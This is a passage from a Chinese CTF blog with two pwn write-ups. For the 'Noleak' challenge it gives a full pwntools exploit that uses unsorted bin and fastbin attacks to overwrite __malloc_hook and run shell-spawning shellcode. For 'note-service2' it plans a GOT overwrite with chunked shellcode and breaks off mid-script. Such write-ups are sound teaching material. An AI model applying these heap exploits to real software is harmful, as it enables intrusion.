</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/31/Noleak/">【XCTF攻防世界】 Noleak</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-31</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><blockquote>
<p>我是一条小咸鱼~~~ 小咸鱼~~~</p>
</blockquote>
<h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">soinux@Caiji:~/ctf/xctf/pwn/noleak$ checksec timu</span><br><span class="line">[*] <span class="string">'/home/soinux/ctf/xctf/pwn/noleak/timu'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<ul>
<li>开了Full RELRO, 不能快乐的改写got表了</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>一共三种操作 create，delete 和 update :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"Index: "</span>, <span class="number">7u</span>);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">free</span>(buf[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>存在UAF 和 double free漏洞 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">upd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> nbytes; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"Index: "</span>, <span class="number">7u</span>);</span><br><span class="line">  LODWORD(v0) = get_num();</span><br><span class="line">  v3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = buf[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"Size: "</span>, <span class="number">6u</span>);</span><br><span class="line">      nbytes = get_num();</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"Data: "</span>, <span class="number">6u</span>);</span><br><span class="line">      LODWORD(v0) = <span class="built_in">read</span>(<span class="number">0</span>, buf[v3], nbytes);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>nbytes大小未限制，可进行堆溢出攻击</li>
</ul>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>有UAF可以实现任意地址写， 但got表只读，要另辟蹊径，改写__malloc_hook, __malloc_hook 在 unsortedbin 附近， 动态调试如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">r = process(<span class="string">'./timu'</span>)</span><br><span class="line"><span class="comment">#打印进程号，便于gdb attach 进程</span></span><br><span class="line">print(<span class="string">'PID: '</span> + str(proc.pidof(r)[<span class="number">0</span>]))</span><br><span class="line">print(proc.pidof(r))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cre</span><span class="params">(size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'1'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(idx)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'2'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upd</span><span class="params">(idx, size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'3'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line"><span class="comment">#因为我的本地环境glibc版本高于2.26(与远程环境不同)</span></span><br><span class="line"><span class="comment">#所以存在tache，要先把tache填满后再free才能加入unsorted bin</span></span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">delt(<span class="number">0</span>)</span><br><span class="line">delt(<span class="number">1</span>)</span><br><span class="line">delt(<span class="number">2</span>)</span><br><span class="line">delt(<span class="number">3</span>)</span><br><span class="line">delt(<span class="number">4</span>)</span><br><span class="line">delt(<span class="number">5</span>)</span><br><span class="line">delt(<span class="number">6</span>)</span><br><span class="line">delt(<span class="number">7</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<ul>
<li>调试也可以用gdb.attach(p)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; attach xxxx</span><br><span class="line">pwndbg&gt; unsortedbin</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x153c680 —▸ 0x7f15684a0be0 (main_arena+96) ◂— add    dh, 0x53 /* 0x153c680 */</span><br></pre></td></tr></table></figure>

<p>根据unsortedbin块的fd指针找到unsortedbin地址为0x7f1564a0be0 查看附近地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x7f15684a0b60</span><br><span class="line">0x7f15684a0b60 &lt;__memalign_hook&gt;:	0x00007f15683535a0	0x00007f1568353c20</span><br><span class="line">0x7f15684a0b70 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f15684a0b80 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f15684a0b90 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f15684a0ba0 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<ul>
<li>因为本机libc库版本不同，以上地址并不准确，根据题目附带的libc库得到的实际情况是__malloc_hook地址后3位十六进制数为0xb10，unsortedbin地址后3位十六进制数为0xb78</li>
</ul>
<p>根据内存的页载入机制，某条指令的后3个十六进制数字的是始终不变的，所以只需要利用unsorted bin attack 将unsorted bin 地址写入buf数组，再利用fastbin attack将unsorted bin 地址最后一位修改为0x10，即可得到__malloc_hook地址，并可以对该地址内容进行修改，修改 unsorted bin 的同时可以进行shellcode部署。</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>,arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#r = remote(host='111.198.29.45', port=33138)</span></span><br><span class="line">r = process(<span class="string">'./timu'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cre</span><span class="params">(size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'1'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(idx)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'2'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upd</span><span class="params">(idx, size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'3'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line">buf_addr = <span class="number">0x601040</span></span><br><span class="line">unsorted_sz = <span class="number">0x80</span></span><br><span class="line">fast_sz = <span class="number">0x60</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cre(unsorted_sz, <span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#在unsorted bin attack 之前申请用于fastbin attack 的chunk，</span></span><br><span class="line">cre(fast_sz, <span class="string">'\n'</span>)</span><br><span class="line">delt(<span class="number">0</span>)</span><br><span class="line">upd(<span class="number">0</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(buf_addr + <span class="number">0x30</span> - <span class="number">0x10</span>))</span><br><span class="line">cre(unsorted_sz, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<p>unsorted bin attack 将unsorted bin 地址写入 buf_addr + 0x30 处 即写入buf[6],这里需要注意，用于fastbin attack 的chunk 要在unsorted bin attack 之前进行申请，否则会出错.但这是为什么呢？？！ 先记录一下报错:<br>    <strong>* Error in `./timu’: malloc(): memory corruption (fast): 0x000000000060107d *</strong><br>该死的tcache毁掉了我本地动态调试的梦想，淦，我又懒得换环境，有空学学docker再来解决这个疑问。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delt(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line">upd(<span class="number">1</span>, <span class="number">0x8</span>, p64(buf_addr + <span class="number">0x2d</span>))</span><br><span class="line">cre(fast_sz, <span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#将buf_addr + 0x30 写入 buf[8], buf_addr + 0x90 写入 buf[9]</span></span><br><span class="line">cre(fast_sz, <span class="string">b'\x00'</span> * <span class="number">3</span> + p64(buf_addr + <span class="number">0x30</span>) + p64(buf_addr + <span class="number">0x90</span>))</span><br></pre></td></tr></table></figure>

<p>fastbin attack 只需要绕过对size的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)   ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">    <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">    <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">        errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">    errout:</span><br><span class="line">        malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>而以buf_addr + 0x2d = 0x60106d伪造的chunck的size字段大小为0x71 而我们之前申请的chunk 的 chunk_sz = 0x60 + 0x10 = 0x70 (不计符号位)，刚好符合检查条件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#*((char *)buf[8]) = '\x10'</span></span><br><span class="line">upd(<span class="number">8</span>, <span class="number">1</span>, <span class="string">'\x10'</span>)</span><br><span class="line"><span class="comment">#修改__malloc_hook 内容为shellcode的地址</span></span><br><span class="line">upd(<span class="number">6</span>, <span class="number">8</span>, p64(buf_addr + <span class="number">0x90</span>))</span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line"><span class="comment">#部署shellcode 到 buf_addr + 0x90</span></span><br><span class="line">upd(<span class="number">9</span>, len(shellcode), shellcode)</span><br><span class="line">r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Size: '</span>, <span class="string">'1'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/19/note-service2/">【XCTF攻防世界】 note-service2</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-19</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><blockquote>
<p>菜鸡的部分PWN wp</p>
</blockquote>
<h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><p>首先查看保护机制:</p>
<pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments</code></pre><ul>
<li>开启了Canary,栈溢出攻击会比较麻烦</li>
<li>没开NX,可以考虑将shellcode写入堆or栈</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_E30</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    put_menu();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your choice&gt;&gt; "</span>);</span><br><span class="line">    get_number();</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        del();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一共有5种操作，只实现了add(), del(), exit()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = note_sum;</span><br><span class="line">  <span class="keyword">if</span> ( note_sum &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = note_sum;</span><br><span class="line">    <span class="keyword">if</span> ( note_sum &lt;= <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">      index = get_number();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"size:"</span>);</span><br><span class="line">      result = get_number();</span><br><span class="line">      <span class="built_in">size</span> = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        note_ptrs[index] = <span class="built_in">malloc</span>(result);</span><br><span class="line">        <span class="keyword">if</span> ( !note_ptrs[index] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"malloc error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"content:"</span>);</span><br><span class="line">        read__(note_ptrs[index], <span class="built_in">size</span>);</span><br><span class="line">        result = note_sum++ + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>没有对index的范围进行限制，可进行数组越界访问</li>
<li>size最大为8(但由于read__()函数中会强制将最后一位赋值为’\0’，实际最多存储7位有效数据)</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v0 = get_number();</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)note_ptrs[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>未对index进行检查且指针free后未置空，存在UAF和double free漏洞(虽然好像用不到)</li>
</ul>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>将shellcode分块，分别存储在物理相连的chunk中，通过jmp short指令实现不同块间的跳转</p>
<blockquote>
<p>jmp short指令占用两字节，且使用相对下一条指令位置寻址，基本形式：0xExx, xx为偏移量，即<br>偏移量 = 目标地址 - 与jmp物理相邻的下一条指令地址 = 目标地址 - jmp指令地址 - 2</p>
</blockquote>
<table>
    <tr>
        <td rowspan="2">chunk0</td>
        <td colspan="3">prev_size</td>
        <td>size</td>
    </tr>
    <tr>
        <td>0x5字节</td>
        <td>jmp short xx</td>
        <td>'\0'</td>
        <td>data_remain(8字节)</td>
    </tr>
    <tr>
        <td rowspan="2">chunk1</td>
        <td colspan="3">prev_size</td>
        <td>size</td>
    </tr>
    <tr>
        <td>0x5字节</td>
        <td>jmp short xx</td>
        <td>'\0'</td>
        <td>data_remain(8字节)</td>
    </tr>
</table>

<p>显然本题中 偏移量 = 1 + sizeof(data_remain) + sizeof(prev_size) + sizeof(size) = 0x19</p>
<p>修改atoi()got表内容为shellcode第一个分块的指针</p>
<blockquote>
<p>.got.plt:0000000000202060 off_202060      dq offset atoi          ; DATA XREF: _atoi↑r<br>                                             ···<br>.bss:00000000002020A0 note_ptrs       dq 0Ch dup(?)           ; DATA XREF: sub_BE0+18↑o</p>
</blockquote>
<p>数组索引-8处为got表atoi()项</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = remote(host = '111.198.29.45', port=56574)</span></span><br><span class="line">sh = process(<span class="string">'./note'</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, context)</span>:</span></span><br><span class="line">    